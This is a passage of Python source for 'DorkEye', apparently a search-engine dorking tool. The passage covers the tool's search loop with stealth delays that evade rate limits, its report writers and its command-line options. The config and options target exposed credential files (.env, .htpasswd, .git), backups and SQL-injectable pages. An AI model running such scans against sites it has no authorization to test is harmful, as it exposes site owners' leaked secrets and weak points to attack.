        return results

    def run_search(self, dorks: List[str], count: int):
        """Run search for all dorks"""
        console.print(f"[bold cyan][*] Search with {len(dorks)} dork(s)[/bold cyan]\n")

        if self.config.get("stealth_mode", False):
            console.print("[bold magenta][*] Stealth mode: ACTIVE[/bold magenta]")
        if self.config.get("http_fingerprinting", True):
            console.print("[bold magenta][*] HTTP Fingerprinting: ENABLED[/bold magenta]")
        if self.config.get("sqli_detection", False):
            console.print("[bold red][*] SQL Injection Detection: ENABLED[/bold red]")

        for index, dork in enumerate(dorks, start=1):
            results = self.search_dork(dork, count)

            if self.config.get("analyze_files", False) or self.config.get("sqli_detection", False):
                results = self.analyze_results(results)

            self.results.extend(results)

            if self.output_file:
                self.save_results()

            if index < len(dorks):
                if self.config.get("stealth_mode", False):
                    delay = round(random.uniform(25, 35), 2)
                else:
                    delay = round(random.uniform(16, 27), 2)

                console.print(f"[yellow][~] Waiting {delay}s before next dork...[/yellow]")
                time.sleep(delay)

                if index % 2 == 0:
                    if self.config.get("stealth_mode", False):
                        long_delay = round(random.uniform(120, 150), 2)
                    else:
                        long_delay = round(random.uniform(85, 110), 2)
                    console.print(f"[bold magenta][~] Extended delay: {long_delay}s (rate limit protection)[/bold magenta]")
                    time.sleep(long_delay)

    def save_results(self):
        """Save results based on selected file extension"""
        if not self.output_file:
            return

        downloads_folder = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "Dump"
        )
        os.makedirs(downloads_folder, exist_ok=True)

        filename = os.path.join(downloads_folder, self.output_file)
        ext = os.path.splitext(filename)[1].lower()

        if not ext:
            # Default to JSON if no extension provided
            filename += ".json"
            ext = ".json"

        if ext == ".csv":
            self._save_csv(filename)
        elif ext == ".json":
            self._save_json(filename)
        elif ext == ".html":
            self._save_html(filename)
        elif ext == ".txt":
            self._save_txt(filename)
        else:
            console.print(f"[red][!] Unsupported output format: {ext}[/red]")
            return

        console.print(f"[green][✓] Saved: {filename}[/green]")

    def _save_csv(self, filename: str):
        """Save results as CSV with SQLi info"""
        if not self.results:
            return

        fieldnames = [
            "url", "title", "snippet", "dork", "timestamp",
            "extension", "category", "file_size", "content_type",
            "accessible", "status_code", "sqli_vulnerable", "sqli_confidence"
        ]

        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
            writer.writeheader()

            for result in self.results:
                row = result.copy()
                if "sqli_test" in result:
                    row["sqli_vulnerable"] = result["sqli_test"].get("vulnerable", False)
                    row["sqli_confidence"] = result["sqli_test"].get("overall_confidence", "none")
                writer.writerow(row)

        console.print(f"[green][✓] CSV saved: {filename}[/green]")

    def _save_json(self, filename: str):
        """Save results as JSON with SQLi details"""
        data = {
            "metadata": {
                "total_results": len(self.results),
                "generated_at": datetime.now().isoformat(),
                "sqli_detection_enabled": self.config.get("sqli_detection", False),
                "sqli_vulnerabilities_found": self.stats.get("sqli_vulnerable", 0),
                "http_fingerprinting_enabled": self.config.get("http_fingerprinting", True),
                "stealth_mode": self.config.get("stealth_mode", False),
                "statistics": dict(self.stats)
            },
            "results": self.results
        }

        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        console.print(f"[green][✓] JSON saved: {filename}[/green]")

    def _save_txt(self, filename: str):
        """Save results as plain text"""
        if not self.results:
            return

        with open(filename, "w", encoding="utf-8") as f:
            for idx, result in enumerate(self.results, 1):
                f.write(f"{idx}. {result.get('url')}\n")

                if result.get("title"):
                    f.write(f"   Title: {result.get('title')}\n")

                if result.get("category"):
                    f.write(f"   Category: {result.get('category')}\n")

                if "sqli_test" in result:
                    sqli = result["sqli_test"]
                    if sqli.get("tested", False):
                        status = "VULNERABLE" if sqli.get("vulnerable") else "SAFE"
                        f.write(f"   SQLi: {status} ({sqli.get('overall_confidence')})\n")

                f.write("\n")

    def _save_html(self, filename: str):
        """Save results as HTML report with SQLi warnings"""
        sqli_count = self.stats.get("sqli_vulnerable", 0)

        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DorkEye v4.2.6 Report</title>
    <style>
        body {{ font-family: 'Courier New', monospace; margin: 20px; background: #0a0a0a; color: #00ff00; }}
        .header {{ background: #1a1a1a; color: #00ff00; padding: 20px; border: 2px solid #00ff00; margin-bottom: 20px; }}
        .header h1 {{ margin: 0; font-size: 24px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin: 20px 0; }}
        .stat-card {{ background: #1a1a1a; padding: 15px; border: 1px solid #00ff00; }}
        .stat-card h3 {{ margin: 0; color: #00ff00; font-size: 14px; }}
        .stat-card p {{ font-size: 20px; font-weight: bold; margin: 10px 0 0 0; color: #fff; }}
        .sqli-alert {{ background: #330000; border: 2px solid #ff0000; padding: 15px; margin: 20px 0; color: #ff0000; }}
        table {{ width: 100%; border-collapse: collapse; background: #1a1a1a; margin: 20px 0; border: 1px solid #00ff00; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ background: #0a0a0a; color: #00ff00; border-bottom: 2px solid #00ff00; }}
        tr:hover {{ background: #2a2a2a; }}
        a {{ color: #00aaff; text-decoration: none; }}
        a:hover {{ color: #00ff00; }}
        .category {{ display: inline-block; padding: 2px 8px; border: 1px solid; font-size: 11px; }}
        .category-documents {{ border-color: #ff6b6b; color: #ff6b6b; }}
        .category-archives {{ border-color: #ffa500; color: #ffa500; }}
        .category-databases {{ border-color: #9b59b6; color: #9b59b6; }}
        .category-backups {{ border-color: #e67e22; color: #e67e22; }}
        .category-configs {{ border-color: #1abc9c; color: #1abc9c; }}
        .category-scripts {{ border-color: #f1c40f; color: #f1c40f; }}
        .category-webpage {{ border-color: #95a5a6; color: #95a5a6; }}
        .sqli-vuln {{ color: #ff0000; font-weight: bold; }}
        .sqli-safe {{ color: #00ff00; }}
        .sqli-untested {{ color: #888; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>┌─[ DorkEye v4.2.6 - OSINT Report ]</h1>
        <p>└─> Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
"""

        if sqli_count > 0:
            html += f"""    <div class="sqli-alert">
        <h2>⚠ SECURITY ALERT ⚠</h2>
        <p><strong>{sqli_count}</strong> potential SQL injection vulnerabilities detected!</p>
        <p>Review the results marked with [SQLI VULN] below.</p>
    </div>
"""

        html += f"""    <div class="stats">
        <div class="stat-card">
            <h3>┌─[ Total Results ]</h3>
            <p>└─> {len(self.results)}</p>
        </div>
        <div class="stat-card">
            <h3>┌─[ Duplicates Filtered ]</h3>
            <p>└─> {self.stats.get('duplicates', 0)}</p>
        </div>
        <div class="stat-card">
            <h3>┌─[ SQLi Vulnerabilities ]</h3>
            <p class="sqli-vuln">└─> {sqli_count}</p>
        </div>
        <div class="stat-card">
            <h3>┌─[ Execution Time ]</h3>
            <p>└─> {round(time.time() - self.start_time, 2)}s</p>
        </div>
    </div>

    <h2>┌─[ Results ]</h2>
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>URL</th>
                <th>Title</th>
                <th>Category</th>
                <th>SQLi Status</th>
                <th>Details</th>
            </tr>
        </thead>
        <tbody>
"""

        for idx, result in enumerate(self.results, 1):
            size = self._format_size(result.get('file_size'))

            sqli_status = "N/A"
            sqli_class = "sqli-untested"

            if "sqli_test" in result and result["sqli_test"].get("tested", False):
                if result["sqli_test"].get("vulnerable", False):
                    confidence = result["sqli_test"].get("overall_confidence", "unknown")
                    sqli_status = f"VULNERABLE ({confidence})"
                    sqli_class = "sqli-vuln"
                else:
                    sqli_status = "SAFE"
                    sqli_class = "sqli-safe"

            html += f"""            <tr>
                <td>{idx}</td>
                <td><a href="{result['url']}" target="_blank">{result['url'][:80]}...</a></td>
                <td>{result.get('title', 'N/A')[:50]}</td>
                <td><span class="category category-{result['category']}">{result['category']}</span></td>
                <td class="{sqli_class}">{sqli_status}</td>
                <td>{size}</td>
            </tr>
"""

        html += """        </tbody>
    </table>
</body>
</html>
"""

        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)

        console.print(f"[green][✓] HTML report saved: {filename}[/green]")

    def _format_size(self, size):
        """Format file size"""
        if size is None:
            return "N/A"
        size = float(size)
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"

    def print_statistics(self):
        """Print final statistics in SQLMap style"""
        table = Table(title="", show_header=False, box=None, padding=(0, 2))
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green", justify="right")

        console.print("\n[bold yellow]┌─[ Search Statistics ][/bold yellow]")
        console.print("[bold yellow]│[/bold yellow]")

        table.add_row("├─> Total Results Found", str(self.stats.get("total_found", 0)))
        table.add_row("├─> Unique Results", str(len(self.results)))
        table.add_row("├─> Duplicates Removed", str(self.stats.get("duplicates", 0)))
        table.add_row("├─> Blacklisted", str(self.stats.get("blacklisted", 0)))

        if self.config.get("sqli_detection", False):
            table.add_row("├─> SQLi Vulnerabilities", f"[bold red]{self.stats.get('sqli_vulnerable', 0)}[/bold red]")

        table.add_row("└─> Execution Time", f"{round(time.time() - self.start_time, 2)}s")

        console.print(table)

        categories = {k.replace("category_", ""): v for k, v in self.stats.items() if k.startswith("category_")}
        if categories:
            cat_table = Table(title="", show_header=False, box=None, padding=(0, 2))
            cat_table.add_column("Category", style="cyan")
            cat_table.add_column("Count", style="green", justify="right")

            console.print("\n[bold yellow]┌─[ Results by Category ][/bold yellow]")
            console.print("[bold yellow]│[/bold yellow]")

            sorted_cats = sorted(categories.items(), key=lambda x: x[1], reverse=True)
            for i, (category, count) in enumerate(sorted_cats):
                prefix = "└─>" if i == len(sorted_cats) - 1 else "├─>"
                cat_table.add_row(f"{prefix} {category.capitalize()}", str(count))

            console.print(cat_table)

def load_config(config_file: str = None) -> Dict:
    """Load configuration from file or use defaults"""
    if not config_file:
        return DEFAULT_CONFIG.copy()

    try:
        with open(config_file, 'r') as f:
            if config_file.endswith('.json'):
                user_config = json.load(f)
            elif config_file.endswith(('.yaml', '.yml')):
                user_config = yaml.safe_load(f)
            else:
                console.print("[red][!] Unsupported config format. Use JSON or YAML[/red]")
                return DEFAULT_CONFIG.copy()

        config = DEFAULT_CONFIG.copy()
        config.update(user_config)
        return config

    except Exception as e:
        console.print(f"[red][!] Error loading config: {e}[/red]")
        console.print("[yellow][!] Using default configuration[/yellow]")
        return DEFAULT_CONFIG.copy()

def create_sample_config():
    """Create sample configuration file"""
    config_yaml = """# DorkEye v4.2.6 Configuration

extensions:
  documents: [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx"]
  archives: [".zip", ".rar", ".tar", ".gz", ".7z"]
  databases: [".sql", ".db", ".sqlite", ".mdb"]
  backups: [".bak", ".backup", ".old"]
  configs: [".conf", ".config", ".ini", ".yaml", ".yml", ".json", ".xml"]
  scripts: [".php", ".asp", ".jsp", ".sh"]
  credentials: [".env", ".git", ".htpasswd"]

blacklist: []
whitelist: []
analyze_files: true
sqli_detection: false
http_fingerprinting: true
stealth_mode: false
request_timeout: 10
max_retries: 3
user_agent_rotation: true
"""

    with open("dorkeye_config.yaml", "w") as f:
        f.write(config_yaml)

    console.print("[green][✓] Sample config created: dorkeye_config.yaml[/green]")

def resolve_templates_argument(template_arg):
    templates_dir = Path(__file__).parent / "Templates"

    # Case 1: no parameter → default
    if template_arg is None:
        return [templates_dir / "dorks_templates.yaml"]

    # Case 2: --templates=all
    if template_arg.lower() == "all":
        yaml_files = list(templates_dir.glob("*.yaml"))

        if not yaml_files:
            console.print("[red][!] No template files found in Templates directory[/red]")
            sys.exit(1)

        return yaml_files

    # Case 3: specific file
    specific_path = templates_dir / template_arg

    if not specific_path.exists():
        console.print(f"[red][!] Template not found: {template_arg}[/red]")
        sys.exit(1)

    return [specific_path]

def main():
    greet_user()

    parser = argparse.ArgumentParser(
        description="DorkEye v4.2.6 | OSINT & Security Dorking Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:

  # Dork(s) Search
    %(prog)s -d "site:example.com filetype:pdf" -o results.json
    %(prog)s -d dorks.txt -c 100 -o output.html
    %(prog)s --dg=all
    %(prog)s --dg=sqli --mode=medium --sqli --stealth -o results.html
    %(prog)s --dg=backups --templates=dorks_templates_research.yaml output.html
    %(prog)s --dg=all --templates=all output.html
    %(prog)s python dorkeye.py --dg=sqli --mode=aggressive --templates=dorks_templates.yaml --sqli --stealth -o report_test.html

"""
    )

    parser.add_argument("-d", "--dork", help="Single dork or file containing dorks")
    parser.add_argument("-o", "--output", help="Output filename (without extension)")
    parser.add_argument("-c", "--count", type=int, default=50, help="Results per dork (default: 50)")
    parser.add_argument("--config", help="Configuration file (YAML or JSON)")
    parser.add_argument("--no-analyze", action="store_true", help="Disable file analysis")
    parser.add_argument("--sqli", action="store_true", help="Enable SQL injection detection")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (slower, safer)")
    parser.add_argument("--no-fingerprint", action="store_true", help="Disable HTTP fingerprinting")    
    parser.add_argument("--templates", type=str, help="Template file inside Templates directory (use --templates=filename.yaml or --templates=all)")
    parser.add_argument("--dg", action="append", nargs="?", const="all", help="Activate Dork Generator (optional: =category)")
    parser.add_argument("--mode", nargs="?", const="soft", default="soft", help="Generation mode: soft, medium, aggressive")
    parser.add_argument("--blacklist", nargs="+", help="Extensions to blacklist (e.g., .pdf .doc)")
    parser.add_argument("--whitelist", nargs="+", help="Extensions to whitelist (e.g., .pdf .xls)")
    parser.add_argument("--create-config", action="store_true", help="Create sample configuration file")

    args = parser.parse_args()

    # Enforce --templates= syntax (no space allowed)
    for arg in sys.argv:
        if arg.startswith("--templates") and not arg.startswith("--templates="):
            console.print("[red][!] Use --templates=filename.yaml format (no spaces)[/red]")
            sys.exit(1)

    VALID_CATEGORIES = ["sqli", "backups", "sensitive", "admin"]
    VALID_MODES = ["soft", "medium", "aggressive"]

    # --- Validate --dg ---
    selected_categories = None

    if args.dg:
        if len(args.dg) > 1:
            parser.error("Multiple --dg arguments are not allowed.")

        dg_value = args.dg[0]

        if dg_value == "all":
            selected_categories = VALID_CATEGORIES
        else:
            if dg_value not in VALID_CATEGORIES:
                parser.error(
                    f"Invalid category '{dg_value}'. "
                    f"Available: {', '.join(VALID_CATEGORIES)}"
                )
            selected_categories = [dg_value]

    # --- Validate --mode ---
    if args.mode not in VALID_MODES:
        parser.error(
            f"Invalid mode '{args.mode}'. "
            f"Available: {', '.join(VALID_MODES)}"
        )

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    console.print(ASCII_LOGO, style="bold cyan")

    if args.create_config:
        create_sample_config()
        return

    if not args.dork and not args.dg:
        parser.print_help()
        return

    config = load_config(args.config)

    if args.no_analyze:
        config["analyze_files"] = False

    if args.sqli:
        config["sqli_detection"] = True

    if args.stealth:
        config["stealth_mode"] = True

    if args.no_fingerprint:
        config["http_fingerprinting"] = False

    if args.blacklist:
        config["blacklist"] = args.blacklist

    if args.whitelist:
        config["whitelist"] = args.whitelist

    dorkeye = DorkEyeEnhanced(config, args.output)

    # Determine dorks source
    template_files = resolve_templates_argument(args.templates)

    console.print(
        f"[cyan][*] Loaded template(s): {', '.join([t.name for t in template_files])}[/cyan]"
    )

    all_dorks = []

    for template_file in template_files:
        generator = DorkGenerator(str(template_file))

        generated = generator.generate(
            categories=selected_categories,
            mode=args.mode
        )

        all_dorks.extend(generated)

    dorks = all_dorks

    console.print(f"[cyan][*] Generated {len(dorks)} dorks (mode: {args.mode})[/cyan]")

    if selected_categories:
        console.print(f"[cyan][*] Categories: {', '.join(selected_categories)}[/cyan]")

    else:
        dorks = dorkeye.process_dorks(args.dork)


    console.print(f"[bold cyan]┌─[ LOADED {len(dorks)} DORK(s) ][/bold cyan]")
    console.print(f"[bold cyan]└─>[/bold cyan] Starting ... \n")

    try:
        dorkeye.run_search(dorks, args.count)
    except KeyboardInterrupt:
        console.print("\n[red][!] Search interrupted by user![/yellow]")

    dorkeye.print_statistics()

    if args.output:
        console.print(f"\n[bold green][✓] Results saved: {args.output}[/bold green]")

if __name__ == "__main__":
    main()
